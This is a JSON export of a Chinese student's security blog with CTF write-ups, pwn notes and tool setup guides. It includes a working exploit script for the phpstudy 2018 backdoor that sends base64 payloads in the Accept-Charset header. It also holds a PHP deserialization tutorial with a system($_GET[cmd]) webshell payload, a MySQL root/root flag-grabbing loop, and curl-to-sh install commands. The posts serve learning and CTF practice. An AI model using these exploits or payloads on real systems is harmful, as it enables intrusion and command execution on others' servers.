{"meta":{"title":"Hu5k7's Blog","subtitle":null,"description":null,"author":"Hu5k7","url":"https://hu5k7.github.io","root":"/"},"pages":[{"title":"标签","date":"2019-09-18T01:59:16.900Z","updated":"2019-06-10T01:48:34.720Z","comments":true,"path":"tags/index.html","permalink":"https://hu5k7.github.io/tags/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2019-09-25T11:39:14.621Z","updated":"2019-09-25T11:39:14.621Z","comments":true,"path":"friends/index.html","permalink":"https://hu5k7.github.io/friends/index.html","excerpt":"","text":"暂时没有，我是孤儿qaq"},{"title":"关于","date":"2019-09-25T11:36:17.415Z","updated":"2019-07-01T01:30:19.631Z","comments":false,"path":"about/index.html","permalink":"https://hu5k7.github.io/about/index.html","excerpt":"","text":"爱好网络空间安全技术，获得过全国职业技能大赛国二。 小菜鸡一枚，刚踏进网络安全圈子的一小点脚 ​"}],"posts":[{"title":"BugkuCTF逆向","slug":"BugkuCTF逆向","date":"2019-11-06T14:59:26.000Z","updated":"2019-11-06T07:40:56.396Z","comments":true,"path":"2019/11/06/BugkuCTF逆向/","link":"","permalink":"https://hu5k7.github.io/2019/11/06/BugkuCTF逆向/","excerpt":"","text":"0x00 开言最近了解了点逆向，pwn，汇编，C，C#等知识，开始试着刷题实战一下。 0x01 入门逆向使用ida打开发现没有任何值得，查看的。直接 按F5查看伪代码 再按R转码 就完事了. 1 0x02 Easy_vbida打开 直接往下看。看到flag 1 0x03 Easy_re这次使用 od工具 。直接上只能搜索看看。 1 0x04 游戏过关 这一题比较难。 需要用到的工具: ida &amp; od 0x04.1 第一步 IDA我们先用 ida 和 od 打开 程序 1 2 我们先看ida这边，先看shift+f12看看字符串 发现字符串窗口有个 done!!!the flag is 这里是最后得出flag的地方，我们先不看他，往下翻 3 4 这次我们看到 Play a game\\n 这里是程序的 开头言的地方。我们双击跳过去看看。 5 这里有调用aPlayAGameTheNI函数。我们按x跳到，调用他的地方。 他跳到了最上面的窗口。我们往下翻 6 看到 input n,n 这里 是让用户输入(1-8)的地方。我们按F5看看伪代码 7 分析一下伪代码。 8 我们看到这里是给用户循环输入的地方 有个断点sub_459418();。就是我们要跳转的地方. 我们现在回到之前看到 done!!! the flag is 地方 跳转过去看一看。 9 看到有一个函数为 aDoneTheFlagIs, 我们打开一个选项，能直接查看到这个的 基址 10 我们往上翻，找到这个的Top位置 11 这里。0045E940我们记下来这个基址 再把 12 sub_459418();这里的基址记下来。 0x04.2 第二步 OD现在我们回到 od 13 先这个程序运行起来。点播放键(左上角) 然后我们点Ctrl+G 来跳转地址到0045E940地方。 14 按F2设置断点。然后到程序里随便输入个数字(1-8),发现该程序运行到了 15 0045f515地址这里停住了，接下来我们用0045e940这个地址 双击0045f515地址，写上jmp 0045e940(jmp为汇编码，意思跳转) 16 17 更新程序运行。点到该程序的循环位置，为止。(0045EB51) 18 白框的位置便是 ｗｈｉｌｅ循环的地方我们在0045EBC1地址设置断点 使这个程序直接跳过ｗｈｉｌｅ循环设置断点后 点继续运行程序 19 20 拿到flag! 转载请标明出处","categories":[{"name":"CTF-Reverse-Note","slug":"CTF-Reverse-Note","permalink":"https://hu5k7.github.io/categories/CTF-Reverse-Note/"}],"tags":[{"name":"CTF-Reverse-Note","slug":"CTF-Reverse-Note","permalink":"https://hu5k7.github.io/tags/CTF-Reverse-Note/"}]},{"title":"【Pwn】学习笔记第零期:开端","slug":"pwn学习笔记-00","date":"2019-11-01T00:00:00.000Z","updated":"2019-11-06T07:43:43.898Z","comments":true,"path":"2019/11/01/pwn学习笔记-00/","link":"","permalink":"https://hu5k7.github.io/2019/11/01/pwn学习笔记-00/","excerpt":"","text":"0x00 起因有一次已经上了深职院的学长告诉我，深职院那边非常缺pwn选手。我一直挺头疼pwn题的，耗眼力。入门难。 而且这方面的资料也相对较少，所以学习pwn的人也是相对较少的。 不过为了多累计一些知识，硬着头皮尝试的往上顶。冲冲冲！！！ 0x01 需要具备的知识 1.扎实的C基础 2.基本DS：链表、队列、栈 3.基本linux配置与命令 4.会汇编更好，不会的话现学几个常用的也可以救急。 0x02 环境搭建使用的系统: ubuntu19 工具: python - pwntools ​ pwndbg ​ ida ​ gcc-multilib 转载请标明出处","categories":[{"name":"CTF-Pwn-Note","slug":"CTF-Pwn-Note","permalink":"https://hu5k7.github.io/categories/CTF-Pwn-Note/"}],"tags":[{"name":"CTF-Pwn-Note","slug":"CTF-Pwn-Note","permalink":"https://hu5k7.github.io/tags/CTF-Pwn-Note/"}]},{"title":"【Pwn】学习笔记第一期:栈知识","slug":"pwn学习笔记-01","date":"2019-11-01T00:00:00.000Z","updated":"2019-11-06T07:43:42.664Z","comments":true,"path":"2019/11/01/pwn学习笔记-01/","link":"","permalink":"https://hu5k7.github.io/2019/11/01/pwn学习笔记-01/","excerpt":"","text":"0x00 需要具备的知识编译程序的内存分配栈区 (stack) 函数运行时分配，函数结束时释放。由编译器自动分配释放 ，存放为运行函数而分配的局部变量、函数参数、返回数据、返回地址等。其操作方式类似于数据结构中的栈。 堆区 (heap) 一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS（操作系统）回收。分配方式类似于链表。 全局区(静态区static) 存放全局变量、静态数据、常量。程序结束后由系统释放。全局区分为已初始化全局区（data）和未初始化全局区（bss）。 常量区(文字常量区)存放常量字符串，程序结束后有系统释放。 代码区 存放函数体（类成员函数和全局区）的二进制代码。 0x01 堆栈(stack)知识 堆栈 转载请标明出处","categories":[{"name":"CTF-Pwn-Note","slug":"CTF-Pwn-Note","permalink":"https://hu5k7.github.io/categories/CTF-Pwn-Note/"}],"tags":[{"name":"CTF-Pwn-Note","slug":"CTF-Pwn-Note","permalink":"https://hu5k7.github.io/tags/CTF-Pwn-Note/"}]},{"title":"phpstudy2018_backdoor_exp","slug":"phpstudy2018-backdoor-exp","date":"2019-10-17T13:50:35.000Z","updated":"2019-10-25T08:20:17.953Z","comments":true,"path":"2019/10/17/phpstudy2018-backdoor-exp/","link":"","permalink":"https://hu5k7.github.io/2019/10/17/phpstudy2018-backdoor-exp/","excerpt":"","text":"0x00 起因前几个星期看到phpstudy带有后门程序。拖到现在才复现,看到可利用便立即写下利用脚本 0x01 exp12345678910111213141516171819202122# -*-coding:utf-8 -*-import base64import requestsdef Expoit(ip,exp): payload = exp pay = base64.b64encode(payload.encode('utf-8')) headers = &#123; \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\", \"Connection\": \"close\", \"Accept-Encoding\": \"gzip,deflate\", \"Accept-Charset\": pay, \"Upgrade-Insecure-Requests\": \"1\", &#125; print(headers) url = ip r = requests.get(url,headers=headers)Expoit(input(\"target url&gt;\"),input(\"payload&gt;\")) 转载请标明出处","categories":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/tags/Python/"}]},{"title":"php反序列化漏洞学习","slug":"PHP反序列化学习","date":"2019-10-05T00:00:00.000Z","updated":"2019-11-06T07:40:39.482Z","comments":true,"path":"2019/10/05/PHP反序列化学习/","link":"","permalink":"https://hu5k7.github.io/2019/10/05/PHP反序列化学习/","excerpt":"","text":"0x00 写在前面PHP反序列化漏洞虽然利用的条件比较苛刻，但是如果可以利用一般都会产生很严重的后果。在春招的时候很多公司都问过这个问题，说明这个反序列化漏洞的技能点也是很多公司比较关注的技能点。 0x01 PHP反序列化漏洞PHP反序列化漏洞,一直围绕着两个函数serialize() 和unserialize() 12serialize() //是用于将类转换为一个字符串unserialize() //用于将字符串转换回一个类 serialize()12345678910&lt;?phpclass fangxuliehua&#123; public $var1=\"test for fangxuliehua\";&#125;$fangxuliehua = new fangxuliehua();//根据fangxuliehua类实列化对象$fangxueliehua_ser = serialize($fangxuliehua);print_r($fangxueliehua_ser);?&gt; 序列化 我们这边创建了新的对象，并将他序列化打印出来。结果为： 1O:12:\"fangxuliehua\":1:&#123;s:4:\"var1\";s:4:\"test\";&#125; 这里的O代表的是存储对象(Object),12则是12个字符，也就是存储对象里有12个字符。“fangxuliehua”则是对象的名称，这里的1则代表了{s:4:”var1”;s:4:”test”;} 里面有一个值。s表示字符串，4则长度。“var1”为字符串名字，后面的相同 unserialize()与 serialize() 对应的，unserialize()可以从已存储的表示中创建PHP的值，单就本次所关心的环境而言，可以从序列化后的结果中恢复对象（object）。 1234567891011121314&lt;?php class fanguxliehua&#123; public $var1=\"test\";&#125;$class= 'O:12:\"fangxuliehua\":1:&#123;s:4:\"var1\";s:4:\"test\";&#125;';print_r($class);echo \"&lt;/br&gt;\";$class_unser=unserialize($class);print_r($class_unser);?&gt; 反序列化 tips:这里使用unserialize()时，会调用__wakeup()成员函数 0x02 反序列化漏洞产生原因当传给 unserialize() 的参数可控时，我们可以通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数。 0x03 利用函数构造PAYLOADMagic functionphp中有一类特殊的方法叫”魔法函数”(Magic function)， 这里我列出了与 php(反)序列化有关的几个魔法函数: 12345678910__construct() //当一个对象创造时被调用__destruct() //当对象被销毁时触发__wakeup() //使用unserialize()时触发__sleep() //使用serialize()时触发__toString() //把类当作字符串使用时触发__get() //用于从不可访问的属性读取数据__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__invoke() //当脚本尝试将对象调用为函数时触发 这里我们着重关注一下几个： 构造函数__construct()：当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。 析构函数__destruct()：当对象被销毁时会自动调用。 __wakeup() ：如前所提，unserialize()时会自动调用。 代码如下: 123456789101112131415161718192021&lt;?phpclass test&#123; var $var='123'; function __wakeup()&#123; echo \"__wakeup\".\"&lt;br&gt;\"; &#125; function __construct()&#123; echo \"__construct\".\"&lt;br&gt;\"; &#125; function __destruct()&#123; echo \"__destruct\".\"&lt;br&gt;\"; &#125;&#125;echo \"序列化所调用的函数:\".\"&lt;br&gt;\";$data=new test(); //根据test类实列化对象$data=serialize($data);echo \"反序列化所调用的函数:\".\"&lt;br&gt;\";$data1=unserialize($data);print_r($data1);?&gt; (反)序列化 利用示范_wakeup() 或__destruct()前面说了利用都是基于“自动调用”的magic function。从而当我们控制序列化字符串时可以去直接触发它们。 这里针对 __wakeup() 场景做个实验。假设index源码如下： 1234567891011121314151617&lt;?phpclass test&#123; var $test = 'test'; function __wakeup()&#123; $fp = fopen(\"webshell.php\",\"w\") ; fwrite($fp,$this-&gt;test); fclose($fp); &#125;&#125;$class_get = $_GET['test'];print_r($class_get);echo \"&lt;/br&gt;\";$class_get_unser = unserialize($class_get);include_once(\"webshell.php\") //包含一下，让它能显示效果 ?&gt; webshell.php需要自己建立。在同目录下建立了一个webshell.php，最先访问index.php 基本思路是，通过serialize()得到我们想要的序列化字符串，之后再传进去。假设我们已知index.php源码。把对象中的$test赋值再调用unserialize()时会通过__wakeup()把$test的写入到shell.php中。 我们写个php脚本: 123456class payload&#123; public $target=\"&lt;?php $a=$_GET[cmd];system($a);?&gt;\";&#125;$a =serialize(new payload);echo $a; 序列化后输出: 1O:7:\"payload\":1:&#123;s:4:\"test\";s:33:\"\";&#125; s:33:””里面没有payload我们自己写进去: tips:与target=里面的?&gt;”发生了冲突，还未找到解决方案 1O:7:\"payload\":1:&#123;s:4:\"test\";s:33:\"&lt;?php $a=$_GET[cmd];system($a);?&gt;\";&#125; 反序列化漏洞 执行成功！ 其他Magic function的利用但如果一次unserialize()中并不会直接调用的魔术函数，比如前面提到的construct()，是不是就没有利用价值呢？并不是。然而类似于PWN中的ROP，有时候反序列化一个对象时，由它调用的wakeup()中又去调用了其他的对象，由此可以溯源而上，利用一次次的“gadget”找到漏洞点。 1234567891011121314151617181920class fangxuliehua_1&#123; function __construct($test)&#123; $fp = fopen(\"webshell.php\",\"w\") ; fwrite($fp,$this-&gt;test); fclose($fp); &#125;&#125;class fangxuliehua_2&#123; public $test='test'; function __wakeup()&#123; $obj=new fangxuliehua_1($this-&gt;test); &#125;&#125;$class_get = $_GET['test'];print_r($class_get);echo \"&lt;/br&gt;\";$class_get_unser = unserialize($class_get);include_once(\"webshell.php\");//包含一下，让它能显示效果 这里我们给test传入构造好的序列化字符串后，进行反序列化时自动调用 wakeup()函数，从而在new fangxuliehua_1()会自动调用对象fangxuliehua_1中的construct()方法，从而把&lt;?php phpinfo() ?&gt;写入到 webshell.php中。 1O:14:\"fangxuliehua_2\":1:&#123;s:4:\"test\";s:18:\"&lt;?php%20phpinfo();?&gt;\";&#125; 调用wakeup 0x04 利用普通成员方法前面谈到的利用都是基于“自动调用”的magic function。但当漏洞/危险代码存在类的普通方法中，就不能指望通过“自动调用”来达到目的了。这时的利用方法如下，寻找相同的函数名，把敏感函数和类联系在一起。 12345678910111213141516171819202122232425262728&lt;?phpclass itishead&#123; public $test; function __construct()&#123; $this-&gt;test= new itisbody(); &#125; function __destruct()&#123; $this-&gt;test-&gt;action(); &#125;&#125;class itisbody&#123; function action()&#123; echo \"hereisbody:)\"; &#125;&#125;class itisfoot&#123; public $test2; function action()&#123; eval($this-&gt;test2); &#125;&#125;$class = new itishead();unserialize($_GET['test']);?&gt; 本意上，new一个新的itishead对象后，调用_construct()，其中又new了itisbody对象。在结束后会调用__destruct()，其中会调用action()，从而输出 itisbody。 利用代码: 123456789101112&lt;?phpclass itishead &#123; var $test; function __construct() &#123; $this-&gt;test = new itisfoot(); &#125;&#125;class itisfoot &#123; var $test2 = \"phpinfo();\";&#125;echo serialize(new itishead());?&gt; 生成： 1O:8:\"itishead\":1:&#123;s:4:\"test\";O:8:\"itisfoot\":1:&#123;s:5:\"test2\";s:10:\"phpinfo();\";&#125;&#125; 把payload传进去: 利用成功截图 利用成功！ 参考链接:https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/ 转载请标明出处","categories":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/categories/Note/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"浅谈经典漏洞HTTP参数污染","slug":"http参数污染","date":"2019-09-24T00:00:00.000Z","updated":"2019-10-25T08:20:11.339Z","comments":true,"path":"2019/09/24/http参数污染/","link":"","permalink":"https://hu5k7.github.io/2019/09/24/http参数污染/","excerpt":"","text":"0x00 问题由来在先知社区看到一篇文章，从HTTP参数污染达成sql注入。 有点不理解HTTP参数污染是什么，于是就去翻了一些资料和看了视频过来总结一下。 0x01 什么是HTTP常数污染HTTP参数污染，简单的来说就是给一个参数附上两个或者两个以上的value。对于不同的引擎引用的value会不同。 假设: 如果是jsp+tomcat 返回的请求是第一个value， 如果php+apache 返回的请求是第二个value， 如果是asp+iis 则会返回两个一起的value 0x02 一些例子1.假设我们有一个网站http://hacker.net/http://hacker.net/search.php?page=10&amp;page=hacker 当服务器遇到同一个参数赋值不同数值时，会将他们连接起来，hacker可以通过这个方法来绕过黑名单例如 http://hacker.net/search.php?page=select 1&amp;page=2,3,database() 不是在黑名单中的模式，不会触发黑名单的拦截功能，其次，由于web程序会采取连接操作，将前后的内容连接起来，SQL注入行为才能够被执行 0x03 注入和HTTP参数污染有什么关系如果该网站是采用两个一起的value一起返回，则可以用于Bypass WAF，也可以用于XSS. 最终取决于web服务器 0x04 结尾经典的漏洞不代表现在没有，可以结合一些payload来达成过WAF。 tips:有点小乱。我看了也有点迷茫了xD 参考链接:https://v.qq.com/x/page/k0870cdqlsb.html 转载请标明出处","categories":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/categories/Note/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"Hexo插入图片问题的总结","slug":"Hexo插入图片问题的总结","date":"2019-09-18T00:00:00.000Z","updated":"2019-10-25T08:20:08.864Z","comments":true,"path":"2019/09/18/Hexo插入图片问题的总结/","link":"","permalink":"https://hu5k7.github.io/2019/09/18/Hexo插入图片问题的总结/","excerpt":"","text":"0x00 起因:插入图片的时候hexo-asset-image 插件会在图片的路径前面自动添加/.io/ 1 0x01 经过了一系列的测试找出了一下几个问题: 问题1 Hexo版本以及插件不是最新 1hexo v 问题2 没有用hexo n &quot;string&quot; 新增文章。 问题3 图片路径的斜杆问题 (/)正斜杆和( \\)反斜杆, 如果图片是直接脱进Makedown，它会写路径的是反斜杆 1![]xx\\xx.png 会让hexo-asset-image插件 自动识别成，加一个名字 正常的：BugKuCTF/xx.png 错误的：BugKuCTF/BugKuCTFxx.png 红色 是错的 蓝色 是对的 问题4 如果在旧版本的Hexo安装过，hexo-asset-image 插件 那就需要重装一遍 12npm remove hexo-asset-imagenpm install hexo-asset-image --save 问题5 这个问题我不知道是不是所有人都会。在makedown下，不区分路径大小写，在hexo上传后网页上区分大小写 0x02 最直接最接地气解决问题的办法就是去修改插件源代码 位置: node_modules\\hexo-asset-image\\index.js tips: 这是我个人博客hexo插入图片时出错的问题,我用的Makedown是Typora，不同的主题有不一样的渲染图片路径的方式，根据不同的方式去修改插件代码。有能力可以自己写插件=w= 转载请标明出处","categories":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/categories/Note/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"Python脚本:搜索本地NAS","slug":"本地NAS扫描","date":"2019-06-20T00:00:00.000Z","updated":"2019-10-25T08:19:53.434Z","comments":true,"path":"2019/06/20/本地NAS扫描/","link":"","permalink":"https://hu5k7.github.io/2019/06/20/本地NAS扫描/","excerpt":"","text":"0x00 介绍每次都会折腾一下实训室的 软路由。不是换linux就是坏掉机子，偶尔还忘记NAS配的固定IP。 所以写下了查找本地NAS脚本。 12345678910111213141516171819202122import socketimport reimport threadingprint(\"\"\"[搜索本地NAS-Version 0.1]\\n默认扫描最后一个网段1.1.1./24\"\"\")host = input(\"本地IP&gt;\")def searchNAS(i): ip = host+str(i) try: Hostname = socket.gethostbyaddr(ip) match = re.search(r'NAS-SERVER',str(Hostname)).group() if match == \"NAS-SERVER\": print(\"NAS服务器IP地址为 &gt; &#123;&#125;:&#123;&#125;\".format(match,ip)) pass except: passfor i in range(0,256): t = threading.Thread(target=searchNAS,args=(i, )) t.start() 局域网内是DHCP会每天会更换IP，所以我打算就做了一个本地NAS的ip搜索器。方便自己找到存储服务器:kissing: 转载请标明出处","categories":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/tags/Python/"}]},{"title":"【BugKuCTF】靶场部分writeup","slug":"BugKuCTF","date":"2019-05-20T00:00:00.000Z","updated":"2019-11-06T07:00:26.461Z","comments":true,"path":"2019/05/20/BugKuCTF/","link":"","permalink":"https://hu5k7.github.io/2019/05/20/BugKuCTF/","excerpt":"","text":"0x00 介绍开始做一些CTF题目了。打算在高职比赛玩玩CTFxD 地址:https://ctf.bugku.com/challenges WEB篇[web2]这种类型直接看源码 F12或者Ctrl+U [计算器]——————————————————试着算出来,然后发现只能输入一位数，就能猜测到他限制了长度，接着我们跑到F12里面去修改即可 计算器1 计算器2 [web基础$_GET]——————————————————不解释，直接看代码 $GET $get1 [web基础$_POST]——————————————————也不解释，直接看代码，需要用到抓包软件 $POST [矛盾]——————————————————先看代码 矛盾 问题出现在 is_numeric 这个函数,is_numeric 是判断 传入的字符串是否为数字。如果是则不输出,不是则输出$num。这个时候我们可以绕过这个函数。 他判断的是数字那么我们给他加点字符串 ?num=1a，则绕过了第一个if判断，并跳到了第二个if判断。 然后他现在直接显示出了flag. 矛盾2 [web3]—————————————————他会一直弹窗出来。不知道为什么我的Chrome不会跳出来。 web3 接着我们直接看源码F12 或者 Ctrl+U，发现最下面有一个被注释的html编码 web3-1 我的方法是，编写到文本，换html格式打开。 web3-2 解码就出来了. [域名解析]————————————————- 域名解析 修改hosts访问 flag.baidu.com即可. hosts位置 windows： C:\\Windows\\System32\\drivers\\etc linux: /etc/hosts [你必须让他停下来]——————————————–打开网址发现他一直刷新。二话不说直接上Burpsuite抓包，并放到Repeater(Ctrl+R)。 多Go几遍就能看到flag了 停下来 [本地文件包含]————————————————–网站进不去。放弃. [变量1]——————————————————先看审计代码，发现最下面有两个$$args 变量1 $$ 容易引发变量覆盖 思考。我们直接让他全部值显示出来。使用全局变量$GLOBALS 我们直接给他 全局变量$GLOBALS传参进去,args=GLOBALS tips:关于全局变量https://www.runoob.com/php/php-superglobals.html 变量1-2 [web5]—————————————————-输入字符串,啥东西都没有 web5 直接看看源码F12 或者 Ctrl+U web5-1 发现这一串看不懂的编码。这种编码是JSFUCK属于一直 加密方式 tips:原理https://blog.csdn.net/qq_36539075/article/details/79946099 直接F12在Console里粘贴 web5-2 [头等舱]——————————————————什么也没有。 头等舱 在看下头等舱。就能猜测到他flag肯定在 请求头那边，于是直接上抓包软件，并GO一遍看看 头等舱1 拿到flag！ [网站被黑]——————————————————打开网站。好炫啊。还会跟着鼠标动，好！偷代码下来了 webshell1 啥也没提示。直接上御剑扫描找到一个。shell的路径 123.206.87.240:8002/webshell/shell.php webshell2 二话不说直接上爆破Burp Suite webshell3 输入上去 20180813135625263 GET到flag [管理员系统]——————————————————打开发现是一个登入界面。尝试使用SQL万能密码登入 捕获 失败了。IP被禁止访问。 捕获1 于是打开抓包软件在请求头上添加上X-Forwarded-For 127.0.0.1 再试试万能密码 捕获2 密码错误。那么我们来看看源码F12 捕获3 看到源码中有一个被注释的base64的编码。于是解密出来看是test123那么用户名是admin密码是test123 tips:不定时更新。每更新十个题目","categories":[{"name":"CTF-Web-Note","slug":"CTF-Web-Note","permalink":"https://hu5k7.github.io/categories/CTF-Web-Note/"}],"tags":[{"name":"CTF-Web-Note","slug":"CTF-Web-Note","permalink":"https://hu5k7.github.io/tags/CTF-Web-Note/"}]},{"title":"Termux安装笔记","slug":"Termux安装","date":"2019-02-02T00:00:00.000Z","updated":"2019-10-25T08:23:28.503Z","comments":true,"path":"2019/02/02/Termux安装/","link":"","permalink":"https://hu5k7.github.io/2019/02/02/Termux安装/","excerpt":"","text":"0x00 介绍为了方便,随时随地能做渗透测试又安装不了NetHuter的时候做出来的整理。也为了方便我自己以后刷系统能在安装回来，写写笔记 科学上网 在Github上搜索ShadowsocksR (https://github.com/shadowsocksr-backup/shadowsocksr-android/releases) 赛风 Termux下载地址 Google商城(要借助科学上网) 酷安 Termux更改源 自动更换指令 1sed -i 's@^\\(deb.*stable main\\)$@#\\1\\ndeb https://mirrors.tuna.tsinghua.edu.cn/termux stable main@' $PREFIX/etc/apt/sources.list 手动修改 ​ 编辑 $PREFIX/etc/apt/sources.list 修改为如下内容 12# The termux repository mirror from TUNA:deb https://mirrors.tuna.tsinghua.edu.cn/termux stable main 并更新pkg up / apt update 两种方法安装metasploit 两种方法安装metasploit 第一种 1pkg install metasploit 一路默认安装 第二种 1234apt install wgetwget https://Auxilus.github.io/metasploit.shsh metasploit.shpkg install metasploit 1 Termux安装一些Python必要的库 1pkg install python python-dev python2 python2-dev Termux安装一些常用的辅助工具 1pkg install git curl 美化Termux oh-my-zsh的安装 1sh -c \"$(curl -fsSL https://github.com/Cabbagec/termux-ohmyzsh/raw/master/install.sh)\" 一步到位，后面自己选择主题和颜色 Termux安装nmap 1pkg install nmap Termux安装SQLMap 12apt install python2 gitgit clone https://github.com/sqlmapproject/sqlmap 转载请标明出处","categories":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/categories/Note/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"【转载】黑苹果安装笔记","slug":"BlackApple","date":"2018-12-15T00:00:00.000Z","updated":"2019-10-25T08:21:34.949Z","comments":true,"path":"2018/12/15/BlackApple/","link":"","permalink":"https://hu5k7.github.io/2018/12/15/BlackApple/","excerpt":"","text":"上个星期装的双系统,win10 & MACOS,还把之前的win10搞崩了。害的我只能重装win10 我要总结的转载的简书都。。帮我一起总结了，所以我就懒的写了 嘻嘻 要点: 1、两系统共存则磁盘必须是GPT格式 2、安装mac要用适合机型的EFI文件和相应的安装配置，特别是显卡驱动&lt;br&gt; 3、安装完以后要把mac和win完整的EFI文件合并到一起并且放入电脑安装时自动分好的EFI分区内&lt;br&gt; 4 、用clover挂载好所有的电脑内EFI引导文件（即mac 和 win的） 简略步骤: 远景：从GPT(GUID) 分区开始,EasyUEFI 双系统安装详解(install.wim + mac10.12.5)这是win7+mac10.12的帖子，比较复杂，可以看看，了解EFI分区。win10+mac10.12 直接看12楼的回复就可以了&lt;br&gt; 分区：PE下分一个ESP ，二个NT&lt;br&gt; 安装MAC：u盘安装 安装win10：PE下安装WIN的WIM镜像，在软件里选对系统分区，启动分区，引导类型 EFI引导：装好WIN后，COPY CLOVER进ESP，就完事了 把Mac efi里面CLOVER文件夹放到esp分区的efi文件夹里，然后用easyuefi添加EFI/CLOVER/CLOVERX64.efi引导 在此之前需要的准备： 硬件方面： 一台i7-7700k + Gigabyte Z270X-Gaming5 台式机 最好有一台可用的mac 2个以上空的8G或以上的U盘 软件方面： 准备好mac 10.11.3镜象 准备好在win上制作mac镜象的工具：transmac(自行百度）或者mac上制作mac镜像的工具：Unibeast 准备好在mac上挂载EFI分区的工具：Clover Configurator BIOS设置： 启动方式：UEFI 硬盘模式：ACHI 家伙事准备得差不多了我们就可以开始了。 一、首先制作mac系统安装盘 1 win系统：在win里下载好mac 10.12系统并安装好transmac 2 Mac 系统：下载macOS Sierra 10.12 并安装Unibeast，制作mac安装盘 二、制作win10系统安装盘 三、安装mac，我们要实现mac和win10同时存在，并要双引导，所以必须要uefi引导方式，而win10要uefi引导就必须装在GPT格式的磁盘上，所以，首先，必须将磁盘设置为GPT格式，所以先用win10的系统盘插入电脑，开机，进入安装界面，在选择装在哪个盘的时候点击shift F10，然后在dos里操作，具体操作不再此说明 设置磁盘格式为GPT以后，退出windows安装，我们先还是安装mac 的，把我们做好的mac系统盘插入电脑，开机，按F7，用U盘引导，选择install OS X EI Capitan,按照提示一步一步安装完成即可，大概20-25分钟，取决于你的U盘速度。这里有个分区的问题，你想给mac多少空间，就多少，其它的不用创建分区，等windows创建即可，我128固态给mac40G。之后mac安装完成 四、安装完成后，关机，插入 win7系统盘，同样UEFI安装用U盘引导，安装在ssd剩下的空间里，没有什么好说的。&lt;br&gt;这个时候windows和mac都安装好了，但是这个时候你拨掉U盘开机会发现直接进入了win10系统，说好的选择呢？ 不急，我们mac的efi也还没有替换呢。 五、处理电脑EFI分区：首先，用U盘引导，进入mac,同时用工具挂载电脑和系统盘两个EFI分区，并把EFI文件夹删除，把我们下载好的EFI文件夹分别放进去，不做作何处理，就是说现在电脑里有mac需要的配置、驱动等都有了，关机，拨掉U盘，开机，进入win10系统，在win10下同样挂载电脑EFI分区，怎么挂载呢？， 插入win10的系统盘，把里边的efi文件夹里边的内容替换进去（注意是内容替换，不是把原来的efi删除，把这个放进去，因为原来的efi里边已经有mac的启动文件了） 替换完了后，关机，拨掉win10系统盘，插入mac系统盘，开机，按F7,用U盘引导，在clover界面先择 boot option ,先择第一个挂载所有引导，忘了具体是什么了，大概是这个意思，如果你发现右下角的clover版本号变了，就成功了，这个时候restart，拨掉U盘，开机应该自动到clover选择界面，可以选择作意系统了。此时mac和win10双引导基本完成。 接下来就是安装各种驱动和完善了 参考:https://www.jianshu.com/p/5db38511cc73","categories":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/categories/Note/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"一周8个精选文章:第一章","slug":"Daily01","date":"2018-12-05T00:00:00.000Z","updated":"2019-11-06T07:40:54.945Z","comments":true,"path":"2018/12/05/Daily01/","link":"","permalink":"https://hu5k7.github.io/2018/12/05/Daily01/","excerpt":"","text":"从外网到内网的渗透姿势分享 : https://xz.aliyun.com/t/5330 基于EVE-NG平台上构建企业内网攻防环境 : https://mp.weixin.qq.com/s/vBYxrmnBoM-Abl_y1v4DtA PHP 函数漏洞总结 : https://blog.csdn.net/qq_31481187/article/details/60968595 CTF Training 经典赛题复现环境: https://github.com/CTFTraining/CTFTraining RemTeam攻击技巧和安全防御 : https://xz.aliyun.com/t/4602(https://evilwing.me/page/2/) 盘点那些渗透测试中的奇淫技巧: https://paper.seebug.org/92/ APT34工具 :https://github.com/p3pperp0tts/APT34 CTF线下攻防指南 : http://blog.nsfocus.net/ctf-off-line-attack-defense-guidelines/ 转载请标明出处","categories":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/categories/Note/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"【Python】:PyMySQL","slug":"Python脚本PyMySQL","date":"2018-10-10T00:00:00.000Z","updated":"2019-10-25T08:23:07.665Z","comments":true,"path":"2018/10/10/Python脚本PyMySQL/","link":"","permalink":"https://hu5k7.github.io/2018/10/10/Python脚本PyMySQL/","excerpt":"","text":"0x00 介绍突然想起来MYSQL是否也能做成自动GETFALG脚本呢。 这个还有点问题。可以自己修改下:) 1234567891011121314151617181920import pymysqlimport threadingfile=open('MySQLsave.txt','w+')def mysql_login(i): ip='192.168.'+str(i)+'101' username='root' password='root' payload = \"SELECT load_file('C:/flag*.txt')\" try: db = pymysql.connect(ip,username,password,\"mysql\") cursor = db.cursor() cursor.execute(payload) data = cursor.fetchall() print(data) except: passfor i in range(1,249): t = 